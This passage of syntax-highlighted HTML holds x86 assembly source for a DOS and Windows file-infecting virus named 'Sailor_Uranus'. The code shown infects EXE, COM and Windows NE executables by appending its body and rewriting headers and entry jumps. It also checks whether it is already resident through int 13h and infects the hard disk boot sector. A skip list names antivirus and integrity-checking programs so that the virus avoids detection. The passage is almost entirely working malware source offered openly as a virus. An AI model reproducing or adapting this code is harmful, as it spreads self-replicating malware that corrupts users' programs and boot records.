                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_entry</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; new CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">victim_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">; new IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">victim_ip</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">800</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; SP after us</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; new SS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">victim_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">; new SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">victim_sp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">; pop length</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; new nr of pages</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; new image mod 512</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0">     </span><span class="sc1">; infection marker</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exeorcom</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; exe marker</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">         </span><span class="sc1">; write virus body</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">                </span><span class="sc1">; go to start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write header</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">exit_exe_infection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">orig_bytes</span><span class="sc0">           </span><span class="sc1">; save first 4 bytes</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc0">                 </span><span class="sc1">; not bigger than...</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">infect_com_exit</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; not smaller than...</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">infect_com_exit</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_entry</span><span class="sc0">     </span><span class="sc1">; calculate jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">com_jump</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exeorcom</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; com marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">         </span><span class="sc1">; write virus body</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">                </span><span class="sc1">; start of the file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write new jump</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_jump</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">infect_com_exit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seekfile</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; move around the file</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">               </span><span class="sc1">; so cwd will work</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc5">seekfile_mid_cx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">seekfile_mid</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">exe_entry</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; EXE and COM entry point</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deltaoffset</span><span class="sc0">
</span><span class="sc5">deltaoffset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">deltaoffset</span><span class="sc0">   </span><span class="sc1">; delta offset</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0123h</span><span class="sc0">                </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2301h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">already_in_mem</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_hd_by_13h</span><span class="sc0">        </span><span class="sc1">; infect hd by int 13h</span><span class="sc0">

</span><span class="sc5">already_in_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exeorcom</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">com_exit</span><span class="sc0">                </span><span class="sc1">; exe or com finish</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; calculate cs and ss</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_cs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_sp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_ss</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; zero regs</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_cs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; push old cs:ip</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; return to old cs:ip</span><span class="sc0">

</span><span class="sc5">victim_ip</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">victim_cs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
</span><span class="sc5">victim_sp</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">victim_ss</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">orig_bytes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; original com bytes</span><span class="sc0">
</span><span class="sc5">com_jump</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; space for our com jump</span><span class="sc0">
                                                </span><span class="sc1">; the S will be also of</span><span class="sc0">
                                                </span><span class="sc1">; use for infection check</span><span class="sc0">
</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Sailor_Uranus'</span><span class="sc0">

</span><span class="sc5">exeorcom</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 01 = COM, 00 = EXE</span><span class="sc0">

</span><span class="sc5">com_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">orig_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; restore 4 com bytes</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; jump to cs:100</span><span class="sc0">

</span><span class="sc5">winexe_entry</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; Entry point for NExes</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0123h</span><span class="sc0">        </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2301h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">already_inf</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000ah</span><span class="sc0">        </span><span class="sc1">; Create Alias Descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; so our cs is writeable</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">31h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">        </span><span class="sc1">; Set Segment Limit</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; so we are _sure_ that we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0c00h</span><span class="sc0">        </span><span class="sc1">; will have enough space for</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">31h</span><span class="sc0">             </span><span class="sc1">; hd infection</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_hdboot</span><span class="sc0">   </span><span class="sc1">; infect HD boot with int 21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">        </span><span class="sc1">; free LDT descriptor we used</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">31h</span><span class="sc0">
</span><span class="sc5">already_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">; return to original exe</span><span class="sc0">
</span><span class="sc5">winip</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wincs</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc5">virus_author</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'b0z0/iKx'</span><span class="sc0">

</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">dontinfect</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AN'</span><span class="sc4">,</span><span class="sc12">'OT'</span><span class="sc4">,</span><span class="sc12">'86'</span><span class="sc4">,</span><span class="sc12">'AV'</span><span class="sc4">,</span><span class="sc12">'VP'</span><span class="sc4">,</span><span class="sc12">'US'</span><span class="sc4">,</span><span class="sc12">'IL'</span><span class="sc4">,</span><span class="sc12">'ED'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'OP'</span><span class="sc4">,</span><span class="sc12">'ND'</span><span class="sc4">,</span><span class="sc12">'LP'</span><span class="sc4">,</span><span class="sc12">'GR'</span><span class="sc4">,</span><span class="sc12">'PL'</span><span class="sc4">,</span><span class="sc12">'RK'</span><span class="sc4">,</span><span class="sc12">'YR'</span><span class="sc4">,</span><span class="sc12">'RE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Antiviruses:</span><span class="sc0">
</span><span class="sc1">; AN - tbscan</span><span class="sc0">
</span><span class="sc1">;    - scan</span><span class="sc0">
</span><span class="sc1">; OT - f-prot</span><span class="sc0">
</span><span class="sc1">; AV - nav</span><span class="sc0">
</span><span class="sc1">;    - ms*av</span><span class="sc0">
</span><span class="sc1">; VP - avp</span><span class="sc0">
</span><span class="sc1">; US - findvirus</span><span class="sc0">
</span><span class="sc1">; OP - virstop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Files that will tell the user that they were changed and that they are</span><span class="sc0">
</span><span class="sc1">; probably infected by a virus:</span><span class="sc0">
</span><span class="sc1">; IL - msmail and msmail releated</span><span class="sc0">
</span><span class="sc1">; ED - mssched.dll</span><span class="sc0">
</span><span class="sc1">;      mssched.exe</span><span class="sc0">
</span><span class="sc1">;      and some other Scheduler+ files</span><span class="sc0">
</span><span class="sc1">; LP - winhelp.exe</span><span class="sc0">
</span><span class="sc1">; GR - wgpomgr.dll</span><span class="sc0">
</span><span class="sc1">;    - mailmgr.dll</span><span class="sc0">
</span><span class="sc1">; PL - mailspl.exe</span><span class="sc0">
</span><span class="sc1">; RK - framework.dll</span><span class="sc0">
</span><span class="sc1">; RE - store.dll</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And this won't be infected because they won't work. I really don't know</span><span class="sc0">
</span><span class="sc1">; why...</span><span class="sc0">
</span><span class="sc1">; ND - lzexpand.dll</span><span class="sc0">
</span><span class="sc1">; 86 - kern386</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">infect_hdboot</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; infects HD boot with int21h</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filebuffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
